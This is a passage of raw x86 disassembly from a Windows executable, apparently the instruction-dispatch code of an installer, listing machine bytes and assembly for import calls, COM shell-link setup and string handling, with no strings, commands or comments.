  401dcf:	89 45 08             	mov    %eax,0x8(%ebp)
  401dd2:	8b c1                	mov    %ecx,%eax
  401dd4:	8b f1                	mov    %ecx,%esi
  401dd6:	83 e0 03             	and    $0x3,%eax
  401dd9:	83 e6 04             	and    $0x4,%esi
  401ddc:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401ddf:	8b c1                	mov    %ecx,%eax
  401de1:	c1 e8 1f             	shr    $0x1f,%eax
  401de4:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401de7:	8b c1                	mov    %ecx,%eax
  401de9:	c1 e8 1e             	shr    $0x1e,%eax
  401dec:	83 e0 01             	and    $0x1,%eax
  401def:	f7 c1 00 00 01 00    	test   $0x10000,%ecx
  401df5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  401df8:	74 09                	je     0x401e03
  401dfa:	6a 11                	push   $0x11
  401dfc:	e8 d1 0f 00 00       	call   0x402dd2
  401e01:	eb 04                	jmp    0x401e07
  401e03:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  401e07:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401e0a:	8d 45 a0             	lea    -0x60(%ebp),%eax
  401e0d:	50                   	push   %eax
  401e0e:	ff 75 08             	push   0x8(%ebp)
  401e11:	ff 15 64 82 40 00    	call   *0x408264
  401e17:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401e1a:	25 f0 fe 00 00       	and    $0xfef0,%eax
  401e1f:	50                   	push   %eax
  401e20:	8b 45 ac             	mov    -0x54(%ebp),%eax
  401e23:	0f af 45 c0          	imul   -0x40(%ebp),%eax
  401e27:	50                   	push   %eax
  401e28:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401e2b:	0f af 45 e8          	imul   -0x18(%ebp),%eax
  401e2f:	50                   	push   %eax
  401e30:	ff 75 c8             	push   -0x38(%ebp)
  401e33:	f7 de                	neg    %esi
  401e35:	ff 75 bc             	push   -0x44(%ebp)
  401e38:	1b f6                	sbb    %esi,%esi
  401e3a:	23 35 60 9a 42 00    	and    0x429a60,%esi
  401e40:	56                   	push   %esi
  401e41:	ff 15 44 82 40 00    	call   *0x408244
  401e47:	8b f0                	mov    %eax,%esi
  401e49:	56                   	push   %esi
  401e4a:	ff 75 c8             	push   -0x38(%ebp)
  401e4d:	68 72 01 00 00       	push   $0x172
  401e52:	ff 75 08             	push   0x8(%ebp)
  401e55:	ff 15 58 82 40 00    	call   *0x408258
  401e5b:	3b c3                	cmp    %ebx,%eax
  401e5d:	74 0c                	je     0x401e6b
  401e5f:	39 5d c8             	cmp    %ebx,-0x38(%ebp)
  401e62:	75 07                	jne    0x401e6b
  401e64:	50                   	push   %eax
  401e65:	ff 15 54 80 40 00    	call   *0x408054
  401e6b:	39 5d d0             	cmp    %ebx,-0x30(%ebp)
  401e6e:	0f 8c e2 0d 00 00    	jl     0x402c56
  401e74:	56                   	push   %esi
  401e75:	e9 18 f7 ff ff       	jmp    0x401592
  401e7a:	ff 75 f8             	push   -0x8(%ebp)
  401e7d:	ff 15 48 82 40 00    	call   *0x408248
  401e83:	6a 02                	push   $0x2
  401e85:	8b f0                	mov    %eax,%esi
  401e87:	e8 24 0f 00 00       	call   0x402db0
  401e8c:	59                   	pop    %ecx
  401e8d:	8b d8                	mov    %eax,%ebx
  401e8f:	6a 48                	push   $0x48
  401e91:	6a 5a                	push   $0x5a
  401e93:	56                   	push   %esi
  401e94:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401e97:	ff 15 48 80 40 00    	call   *0x408048
  401e9d:	50                   	push   %eax
  401e9e:	53                   	push   %ebx
  401e9f:	ff 15 48 81 40 00    	call   *0x408148
  401ea5:	56                   	push   %esi
  401ea6:	ff 75 f8             	push   -0x8(%ebp)
  401ea9:	f7 d8                	neg    %eax
  401eab:	a3 f8 cd 40 00       	mov    %eax,0x40cdf8
  401eb0:	ff 15 4c 82 40 00    	call   *0x40824c
  401eb6:	6a 03                	push   $0x3
  401eb8:	e8 f3 0e 00 00       	call   0x402db0
  401ebd:	a3 08 ce 40 00       	mov    %eax,0x40ce08
  401ec2:	8a 45 e0             	mov    -0x20(%ebp),%al
  401ec5:	59                   	pop    %ecx
  401ec6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401ec9:	ff 75 d4             	push   -0x2c(%ebp)
  401ecc:	8a c8                	mov    %al,%cl
  401ece:	80 e1 01             	and    $0x1,%cl
  401ed1:	c6 05 0f ce 40 00 01 	movb   $0x1,0x40ce0f
  401ed8:	88 0d 0c ce 40 00    	mov    %cl,0x40ce0c
  401ede:	8a c8                	mov    %al,%cl
  401ee0:	80 e1 02             	and    $0x2,%cl
  401ee3:	24 04                	and    $0x4,%al
  401ee5:	68 14 ce 40 00       	push   $0x40ce14
  401eea:	88 0d 0d ce 40 00    	mov    %cl,0x40ce0d
  401ef0:	a2 0e ce 40 00       	mov    %al,0x40ce0e
  401ef5:	e8 1f 48 00 00       	call   0x406719
  401efa:	68 f8 cd 40 00       	push   $0x40cdf8
  401eff:	ff 15 5c 80 40 00    	call   *0x40805c
  401f05:	e9 5a 07 00 00       	jmp    0x402664
  401f0a:	53                   	push   %ebx
  401f0b:	e8 a0 0e 00 00       	call   0x402db0
  401f10:	6a 01                	push   $0x1
  401f12:	8b f0                	mov    %eax,%esi
  401f14:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f17:	e8 94 0e 00 00       	call   0x402db0
  401f1c:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401f1f:	59                   	pop    %ecx
  401f20:	59                   	pop    %ecx
  401f21:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401f24:	50                   	push   %eax
  401f25:	56                   	push   %esi
  401f26:	75 0b                	jne    0x401f33
  401f28:	ff 15 28 82 40 00    	call   *0x408228
  401f2e:	e9 23 0d 00 00       	jmp    0x402c56
  401f33:	ff 15 50 82 40 00    	call   *0x408250
  401f39:	e9 18 0d 00 00       	jmp    0x402c56
  401f3e:	53                   	push   %ebx
  401f3f:	e8 8e 0e 00 00       	call   0x402dd2
  401f44:	6a 31                	push   $0x31
  401f46:	8b f0                	mov    %eax,%esi
  401f48:	e8 85 0e 00 00       	call   0x402dd2
  401f4d:	6a 22                	push   $0x22
  401f4f:	8b d8                	mov    %eax,%ebx
  401f51:	e8 7c 0e 00 00       	call   0x402dd2
  401f56:	6a 15                	push   $0x15
  401f58:	8b f8                	mov    %eax,%edi
  401f5a:	e8 73 0e 00 00       	call   0x402dd2
  401f5f:	6a ec                	push   $0xffffffec
  401f61:	e8 bd f4 ff ff       	call   0x401423
  401f66:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401f69:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  401f6f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401f72:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  401f78:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f7b:	89 45 90             	mov    %eax,-0x70(%ebp)
  401f7e:	66 8b 06             	mov    (%esi),%ax
  401f81:	66 f7 d8             	neg    %ax
  401f84:	1b c0                	sbb    %eax,%eax
  401f86:	89 5d 84             	mov    %ebx,-0x7c(%ebp)
  401f89:	23 c6                	and    %esi,%eax
  401f8b:	89 45 80             	mov    %eax,-0x80(%ebp)
  401f8e:	66 8b 07             	mov    (%edi),%ax
  401f91:	66 f7 d8             	neg    %ax
  401f94:	1b c0                	sbb    %eax,%eax
  401f96:	c7 45 8c 00 50 43 00 	movl   $0x435000,-0x74(%ebp)
  401f9d:	23 c7                	and    %edi,%eax
  401f9f:	89 45 88             	mov    %eax,-0x78(%ebp)
  401fa2:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  401fa8:	50                   	push   %eax
  401fa9:	e8 54 3d 00 00       	call   0x405d02
  401fae:	85 c0                	test   %eax,%eax
  401fb0:	0f 84 a4 09 00 00    	je     0x40295a
  401fb6:	f6 85 78 ff ff ff 40 	testb  $0x40,-0x88(%ebp)
  401fbd:	0f 84 93 0c 00 00    	je     0x402c56
  401fc3:	ff 75 ac             	push   -0x54(%ebp)
  401fc6:	e8 b0 4b 00 00       	call   0x406b7b
  401fcb:	ff 75 ac             	push   -0x54(%ebp)
  401fce:	eb 47                	jmp    0x402017
  401fd0:	53                   	push   %ebx
  401fd1:	e8 fc 0d 00 00       	call   0x402dd2
  401fd6:	8b f0                	mov    %eax,%esi
  401fd8:	56                   	push   %esi
  401fd9:	6a eb                	push   $0xffffffeb
  401fdb:	e8 81 37 00 00       	call   0x405761
  401fe0:	56                   	push   %esi
  401fe1:	e8 d9 3c 00 00       	call   0x405cbf
  401fe6:	8b f0                	mov    %eax,%esi
  401fe8:	3b f3                	cmp    %ebx,%esi
  401fea:	0f 84 6a 09 00 00    	je     0x40295a
  401ff0:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401ff3:	74 21                	je     0x402016
  401ff5:	56                   	push   %esi
  401ff6:	e8 80 4b 00 00       	call   0x406b7b
  401ffb:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401ffe:	7c 0b                	jl     0x40200b
  402000:	50                   	push   %eax
  402001:	ff 75 f4             	push   -0xc(%ebp)
  402004:	e8 1a 46 00 00       	call   0x406623
  402009:	eb 0b                	jmp    0x402016
  40200b:	3b c3                	cmp    %ebx,%eax
  40200d:	74 07                	je     0x402016
  40200f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402016:	56                   	push   %esi
  402017:	ff 15 fc 80 40 00    	call   *0x4080fc
  40201d:	e9 34 0c 00 00       	jmp    0x402c56
  402022:	6a 02                	push   $0x2
  402024:	e8 a9 0d 00 00       	call   0x402dd2
  402029:	50                   	push   %eax
  40202a:	e8 0a 4a 00 00       	call   0x406a39
  40202f:	8b f0                	mov    %eax,%esi
  402031:	3b f3                	cmp    %ebx,%esi
  402033:	74 13                	je     0x402048
  402035:	ff 76 14             	push   0x14(%esi)
  402038:	ff 75 f4             	push   -0xc(%ebp)
  40203b:	e8 e3 45 00 00       	call   0x406623
  402040:	ff 76 18             	push   0x18(%esi)
  402043:	e9 4a f5 ff ff       	jmp    0x401592
  402048:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40204b:	66 89 1f             	mov    %bx,(%edi)
  40204e:	66 89 18             	mov    %bx,(%eax)
  402051:	e9 04 09 00 00       	jmp    0x40295a
  402056:	6a ee                	push   $0xffffffee
  402058:	e8 75 0d 00 00       	call   0x402dd2
  40205d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402060:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402063:	51                   	push   %ecx
  402064:	50                   	push   %eax
  402065:	6a 0b                	push   $0xb
  402067:	e8 64 4a 00 00       	call   0x406ad0
  40206c:	ff d0                	call   *%eax
  40206e:	8b f0                	mov    %eax,%esi
  402070:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402073:	66 89 1f             	mov    %bx,(%edi)
  402076:	3b f3                	cmp    %ebx,%esi
  402078:	66 89 18             	mov    %bx,(%eax)
  40207b:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402082:	0f 84 ce 0b 00 00    	je     0x402c56
  402088:	56                   	push   %esi
  402089:	6a 40                	push   $0x40
  40208b:	ff 15 10 81 40 00    	call   *0x408110
  402091:	3b c3                	cmp    %ebx,%eax
  402093:	89 45 08             	mov    %eax,0x8(%ebp)
  402096:	0f 84 ba 0b 00 00    	je     0x402c56
  40209c:	6a 0c                	push   $0xc
  40209e:	e8 2d 4a 00 00       	call   0x406ad0
  4020a3:	6a 0d                	push   $0xd
  4020a5:	89 45 c0             	mov    %eax,-0x40(%ebp)
  4020a8:	e8 23 4a 00 00       	call   0x406ad0
  4020ad:	ff 75 08             	push   0x8(%ebp)
  4020b0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4020b3:	56                   	push   %esi
  4020b4:	53                   	push   %ebx
  4020b5:	ff 75 c8             	push   -0x38(%ebp)
  4020b8:	ff 55 c0             	call   *-0x40(%ebp)
  4020bb:	85 c0                	test   %eax,%eax
  4020bd:	74 3c                	je     0x4020fb
  4020bf:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  4020c2:	50                   	push   %eax
  4020c3:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4020c6:	50                   	push   %eax
  4020c7:	68 14 a0 40 00       	push   $0x40a014
  4020cc:	ff 75 08             	push   0x8(%ebp)
  4020cf:	ff 55 e8             	call   *-0x18(%ebp)
  4020d2:	85 c0                	test   %eax,%eax
  4020d4:	74 25                	je     0x4020fb
  4020d6:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4020d9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4020dc:	ff 74 88 08          	push   0x8(%eax,%ecx,4)
  4020e0:	57                   	push   %edi
  4020e1:	e8 3d 45 00 00       	call   0x406623
  4020e6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4020e9:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  4020ec:	ff 74 81 0c          	push   0xc(%ecx,%eax,4)
  4020f0:	ff 75 f4             	push   -0xc(%ebp)
  4020f3:	e8 2b 45 00 00       	call   0x406623
  4020f8:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4020fb:	ff 75 08             	push   0x8(%ebp)
  4020fe:	e9 34 fb ff ff       	jmp    0x401c37
  402103:	39 1d 20 9b 42 00    	cmp    %ebx,0x429b20
  402109:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402110:	0f 8c b9 00 00 00    	jl     0x4021cf
  402116:	6a f0                	push   $0xfffffff0
  402118:	e8 b5 0c 00 00       	call   0x402dd2
  40211d:	6a 01                	push   $0x1
  40211f:	8b f8                	mov    %eax,%edi
  402121:	e8 ac 0c 00 00       	call   0x402dd2
  402126:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402129:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40212c:	74 0e                	je     0x40213c
  40212e:	57                   	push   %edi
  40212f:	ff 15 14 81 40 00    	call   *0x408114
  402135:	3b c3                	cmp    %ebx,%eax
  402137:	89 45 08             	mov    %eax,0x8(%ebp)
  40213a:	75 11                	jne    0x40214d
  40213c:	6a 08                	push   $0x8
  40213e:	53                   	push   %ebx
  40213f:	57                   	push   %edi
  402140:	ff 15 18 81 40 00    	call   *0x408118
  402146:	3b c3                	cmp    %ebx,%eax
  402148:	89 45 08             	mov    %eax,0x8(%ebp)
  40214b:	74 7b                	je     0x4021c8
  40214d:	ff 75 bc             	push   -0x44(%ebp)
  402150:	ff 75 08             	push   0x8(%ebp)
  402153:	e8 e7 49 00 00       	call   0x406b3f
  402158:	8b f8                	mov    %eax,%edi
  40215a:	3b fb                	cmp    %ebx,%edi
  40215c:	74 39                	je     0x402197
  40215e:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402161:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402164:	74 17                	je     0x40217d
  402166:	ff 75 d8             	push   -0x28(%ebp)
  402169:	e8 b5 f2 ff ff       	call   0x401423
  40216e:	ff d7                	call   *%edi
  402170:	85 c0                	test   %eax,%eax
  402172:	74 2d                	je     0x4021a1
  402174:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40217b:	eb 24                	jmp    0x4021a1
  40217d:	68 00 a0 40 00       	push   $0x40a000
  402182:	68 58 ce 40 00       	push   $0x40ce58
  402187:	56                   	push   %esi
  402188:	68 00 04 00 00       	push   $0x400
  40218d:	ff 75 f8             	push   -0x8(%ebp)
  402190:	ff d7                	call   *%edi
  402192:	83 c4 14             	add    $0x14,%esp
  402195:	eb 0a                	jmp    0x4021a1
  402197:	ff 75 bc             	push   -0x44(%ebp)
  40219a:	6a f7                	push   $0xfffffff7
  40219c:	e8 c0 35 00 00       	call   0x405761
  4021a1:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4021a4:	0f 85 ac 0a 00 00    	jne    0x402c56
  4021aa:	ff 75 08             	push   0x8(%ebp)
  4021ad:	e8 9c 1b 00 00       	call   0x403d4e
  4021b2:	85 c0                	test   %eax,%eax
  4021b4:	0f 84 9c 0a 00 00    	je     0x402c56
  4021ba:	ff 75 08             	push   0x8(%ebp)
  4021bd:	ff 15 1c 81 40 00    	call   *0x40811c
  4021c3:	e9 8e 0a 00 00       	jmp    0x402c56
  4021c8:	6a f6                	push   $0xfffffff6
  4021ca:	e9 4e 01 00 00       	jmp    0x40231d
  4021cf:	6a e7                	push   $0xffffffe7
  4021d1:	e9 47 01 00 00       	jmp    0x40231d
  4021d6:	6a f0                	push   $0xfffffff0
  4021d8:	e8 f5 0b 00 00       	call   0x402dd2
  4021dd:	6a df                	push   $0xffffffdf
  4021df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4021e2:	e8 eb 0b 00 00       	call   0x402dd2
  4021e7:	6a 02                	push   $0x2
  4021e9:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021ec:	e8 e1 0b 00 00       	call   0x402dd2
  4021f1:	6a cd                	push   $0xffffffcd
  4021f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4021f6:	e8 d7 0b 00 00       	call   0x402dd2
  4021fb:	6a 45                	push   $0x45
  4021fd:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  402200:	e8 cd 0b 00 00       	call   0x402dd2
  402205:	ff 75 bc             	push   -0x44(%ebp)
  402208:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40220b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40220e:	8b c8                	mov    %eax,%ecx
  402210:	8b f8                	mov    %eax,%edi
  402212:	8b f0                	mov    %eax,%esi
  402214:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
  40221a:	c1 f8 10             	sar    $0x10,%eax
  40221d:	c1 fe 0c             	sar    $0xc,%esi
  402220:	25 ff ff 00 00       	and    $0xffff,%eax
  402225:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  402228:	81 e7 00 80 00 00    	and    $0x8000,%edi
  40222e:	83 e6 07             	and    $0x7,%esi
  402231:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402234:	e8 e9 3d 00 00       	call   0x406022
  402239:	85 c0                	test   %eax,%eax
  40223b:	75 07                	jne    0x402244
  40223d:	6a 21                	push   $0x21
  40223f:	e8 8e 0b 00 00       	call   0x402dd2
  402244:	8d 45 08             	lea    0x8(%ebp),%eax
  402247:	50                   	push   %eax
  402248:	68 cc 84 40 00       	push   $0x4084cc
  40224d:	6a 01                	push   $0x1
  40224f:	53                   	push   %ebx
  402250:	68 dc 84 40 00       	push   $0x4084dc
  402255:	ff 15 90 82 40 00    	call   *0x408290
  40225b:	3b c3                	cmp    %ebx,%eax
  40225d:	0f 8c b1 00 00 00    	jl     0x402314
  402263:	8b 45 08             	mov    0x8(%ebp),%eax
  402266:	8d 55 c8             	lea    -0x38(%ebp),%edx
  402269:	52                   	push   %edx
  40226a:	68 ec 84 40 00       	push   $0x4084ec
  40226f:	8b 08                	mov    (%eax),%ecx
  402271:	50                   	push   %eax
  402272:	ff 11                	call   *(%ecx)
  402274:	3b c3                	cmp    %ebx,%eax
  402276:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402279:	0f 8c 87 00 00 00    	jl     0x402306
  40227f:	8b 45 08             	mov    0x8(%ebp),%eax
  402282:	ff 75 bc             	push   -0x44(%ebp)
  402285:	8b 08                	mov    (%eax),%ecx
  402287:	50                   	push   %eax
  402288:	ff 51 50             	call   *0x50(%ecx)
  40228b:	3b fb                	cmp    %ebx,%edi
  40228d:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402290:	75 0e                	jne    0x4022a0
  402292:	8b 45 08             	mov    0x8(%ebp),%eax
  402295:	68 00 50 43 00       	push   $0x435000
  40229a:	50                   	push   %eax
  40229b:	8b 08                	mov    (%eax),%ecx
  40229d:	ff 51 24             	call   *0x24(%ecx)
  4022a0:	3b f3                	cmp    %ebx,%esi
  4022a2:	74 0a                	je     0x4022ae
  4022a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4022a7:	56                   	push   %esi
  4022a8:	50                   	push   %eax
  4022a9:	8b 08                	mov    (%eax),%ecx
  4022ab:	ff 51 3c             	call   *0x3c(%ecx)
  4022ae:	8b 45 08             	mov    0x8(%ebp),%eax
  4022b1:	ff 75 c0             	push   -0x40(%ebp)
  4022b4:	8b 08                	mov    (%eax),%ecx
  4022b6:	50                   	push   %eax
  4022b7:	ff 51 34             	call   *0x34(%ecx)
  4022ba:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  4022bd:	66 39 19             	cmp    %bx,(%ecx)
  4022c0:	74 0d                	je     0x4022cf
  4022c2:	8b 45 08             	mov    0x8(%ebp),%eax
  4022c5:	ff 75 b0             	push   -0x50(%ebp)
  4022c8:	8b 10                	mov    (%eax),%edx
  4022ca:	51                   	push   %ecx
  4022cb:	50                   	push   %eax
  4022cc:	ff 52 44             	call   *0x44(%edx)
  4022cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4022d2:	ff 75 f8             	push   -0x8(%ebp)
  4022d5:	8b 08                	mov    (%eax),%ecx
  4022d7:	50                   	push   %eax
  4022d8:	ff 51 2c             	call   *0x2c(%ecx)
  4022db:	8b 45 08             	mov    0x8(%ebp),%eax
  4022de:	ff 75 f4             	push   -0xc(%ebp)
  4022e1:	8b 08                	mov    (%eax),%ecx
  4022e3:	50                   	push   %eax
  4022e4:	ff 51 1c             	call   *0x1c(%ecx)
  4022e7:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4022ea:	7c 11                	jl     0x4022fd
  4022ec:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4022ef:	6a 01                	push   $0x1
  4022f1:	ff 75 f0             	push   -0x10(%ebp)
  4022f4:	8b 08                	mov    (%eax),%ecx
  4022f6:	50                   	push   %eax
  4022f7:	ff 51 18             	call   *0x18(%ecx)
  4022fa:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4022fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402300:	50                   	push   %eax
  402301:	8b 08                	mov    (%eax),%ecx
  402303:	ff 51 08             	call   *0x8(%ecx)
  402306:	8b 45 08             	mov    0x8(%ebp),%eax
  402309:	50                   	push   %eax
  40230a:	8b 08                	mov    (%eax),%ecx
  40230c:	ff 51 08             	call   *0x8(%ecx)
  40230f:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402312:	7d 13                	jge    0x402327
  402314:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40231b:	6a f0                	push   $0xfffffff0
  40231d:	e8 01 f1 ff ff       	call   0x401423
  402322:	e9 2f 09 00 00       	jmp    0x402c56
  402327:	6a f4                	push   $0xfffffff4
  402329:	eb f2                	jmp    0x40231d
  40232b:	53                   	push   %ebx
  40232c:	e8 a1 0a 00 00       	call   0x402dd2
  402331:	6a 11                	push   $0x11
  402333:	8b f0                	mov    %eax,%esi
  402335:	e8 98 0a 00 00       	call   0x402dd2
  40233a:	6a 23                	push   $0x23
  40233c:	8b f8                	mov    %eax,%edi
  40233e:	e8 8f 0a 00 00       	call   0x402dd2
  402343:	56                   	push   %esi
  402344:	89 45 08             	mov    %eax,0x8(%ebp)
  402347:	e8 ed 46 00 00       	call   0x406a39
  40234c:	85 c0                	test   %eax,%eax
  40234e:	75 0d                	jne    0x40235d
  402350:	53                   	push   %ebx
  402351:	6a f9                	push   $0xfffffff9
  402353:	e8 09 34 00 00       	call   0x405761
  402358:	e9 fd 05 00 00       	jmp    0x40295a
  40235d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402360:	56                   	push   %esi
  402361:	89 45 90             	mov    %eax,-0x70(%ebp)
  402364:	c7 45 94 02 00 00 00 	movl   $0x2,-0x6c(%ebp)
  40236b:	e8 82 43 00 00       	call   0x4066f2
  402370:	57                   	push   %edi
  402371:	66 89 5c 46 02       	mov    %bx,0x2(%esi,%eax,2)
  402376:	e8 77 43 00 00       	call   0x4066f2
  40237b:	66 89 5c 47 02       	mov    %bx,0x2(%edi,%eax,2)
  402380:	8b 45 08             	mov    0x8(%ebp),%eax
  402383:	66 8b 4d d8          	mov    -0x28(%ebp),%cx
  402387:	50                   	push   %eax
  402388:	53                   	push   %ebx
  402389:	89 75 98             	mov    %esi,-0x68(%ebp)
  40238c:	89 7d 9c             	mov    %edi,-0x64(%ebp)
  40238f:	89 45 aa             	mov    %eax,-0x56(%ebp)
  402392:	66 89 4d a0          	mov    %cx,-0x60(%ebp)
  402396:	e8 c6 33 00 00       	call   0x405761
  40239b:	8d 45 90             	lea    -0x70(%ebp),%eax
  40239e:	50                   	push   %eax
  40239f:	ff 15 80 81 40 00    	call   *0x408180
  4023a5:	85 c0                	test   %eax,%eax
  4023a7:	0f 84 a9 08 00 00    	je     0x402c56
  4023ad:	eb a1                	jmp    0x402350
  4023af:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  4023b4:	74 1d                	je     0x4023d3
  4023b6:	68 10 00 20 00       	push   $0x200010
  4023bb:	6a e8                	push   $0xffffffe8
  4023bd:	53                   	push   %ebx
  4023be:	e8 56 43 00 00       	call   0x406719
  4023c3:	50                   	push   %eax
  4023c4:	e8 73 39 00 00       	call   0x405d3c
  4023c9:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  4023ce:	e9 8e 08 00 00       	jmp    0x402c61
  4023d3:	ff 05 f4 9a 42 00    	incl   0x429af4
  4023d9:	e9 78 08 00 00       	jmp    0x402c56
  4023de:	33 f6                	xor    %esi,%esi
  4023e0:	33 ff                	xor    %edi,%edi
  4023e2:	3b c3                	cmp    %ebx,%eax
  4023e4:	74 08                	je     0x4023ee
  4023e6:	53                   	push   %ebx
  4023e7:	e8 e6 09 00 00       	call   0x402dd2
  4023ec:	8b f0                	mov    %eax,%esi
  4023ee:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4023f1:	74 09                	je     0x4023fc
  4023f3:	6a 11                	push   $0x11
  4023f5:	e8 d8 09 00 00       	call   0x402dd2
  4023fa:	8b f8                	mov    %eax,%edi
  4023fc:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4023ff:	74 09                	je     0x40240a
  402401:	6a 22                	push   $0x22
  402403:	e8 ca 09 00 00       	call   0x402dd2
  402408:	8b d8                	mov    %eax,%ebx
  40240a:	6a cd                	push   $0xffffffcd
  40240c:	e8 c1 09 00 00       	call   0x402dd2
  402411:	50                   	push   %eax
  402412:	53                   	push   %ebx
  402413:	57                   	push   %edi
  402414:	56                   	push   %esi
  402415:	ff 15 20 81 40 00    	call   *0x408120
  40241b:	e9 b9 f1 ff ff       	jmp    0x4015d9
  402420:	a1 10 a0 40 00       	mov    0x40a010,%eax
  402425:	6a 01                	push   $0x1
  402427:	89 45 08             	mov    %eax,0x8(%ebp)
  40242a:	e8 a3 09 00 00       	call   0x402dd2
  40242f:	6a 12                	push   $0x12
  402431:	8b f0                	mov    %eax,%esi
  402433:	e8 9a 09 00 00       	call   0x402dd2
  402438:	6a dd                	push   $0xffffffdd
  40243a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40243d:	e8 90 09 00 00       	call   0x402dd2
  402442:	50                   	push   %eax
  402443:	68 ff 03 00 00       	push   $0x3ff
  402448:	8d 45 08             	lea    0x8(%ebp),%eax
  40244b:	57                   	push   %edi
  40244c:	50                   	push   %eax
  40244d:	ff 75 f0             	push   -0x10(%ebp)
  402450:	56                   	push   %esi
  402451:	ff 15 24 81 40 00    	call   *0x408124
  402457:	66 83 3f 0a          	cmpw   $0xa,(%edi)
  40245b:	e9 1d f3 ff ff       	jmp    0x40177d
  402460:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402463:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  402466:	75 2b                	jne    0x402493
  402468:	6a 02                	push   $0x2
  40246a:	e8 a3 09 00 00       	call   0x402e12
  40246f:	8b f0                	mov    %eax,%esi
  402471:	3b f3                	cmp    %ebx,%esi
  402473:	0f 84 e1 04 00 00    	je     0x40295a
  402479:	6a 33                	push   $0x33
  40247b:	e8 52 09 00 00       	call   0x402dd2
  402480:	50                   	push   %eax
  402481:	56                   	push   %esi
  402482:	ff 15 14 80 40 00    	call   *0x408014
  402488:	56                   	push   %esi
  402489:	8b f8                	mov    %eax,%edi
  40248b:	ff 15 10 80 40 00    	call   *0x408010
  402491:	eb 16                	jmp    0x4024a9
  402493:	6a 22                	push   $0x22
  402495:	e8 38 09 00 00       	call   0x402dd2
  40249a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40249d:	d1 f9                	sar    $1,%ecx
  40249f:	51                   	push   %ecx
  4024a0:	50                   	push   %eax
  4024a1:	56                   	push   %esi
  4024a2:	e8 e9 09 00 00       	call   0x402e90
  4024a7:	8b f8                	mov    %eax,%edi
  4024a9:	3b fb                	cmp    %ebx,%edi
  4024ab:	0f 84 a5 07 00 00    	je     0x402c56
  4024b1:	e9 a4 04 00 00       	jmp    0x40295a
  4024b6:	8b 75 e0             	mov    -0x20(%ebp),%esi
  4024b9:	8b f8                	mov    %eax,%edi
  4024bb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4024be:	6a 02                	push   $0x2
  4024c0:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4024c3:	e8 0a 09 00 00       	call   0x402dd2
  4024c8:	6a 11                	push   $0x11
  4024ca:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4024cd:	e8 00 09 00 00       	call   0x402dd2
  4024d2:	6a 02                	push   $0x2
  4024d4:	50                   	push   %eax
  4024d5:	57                   	push   %edi
  4024d6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
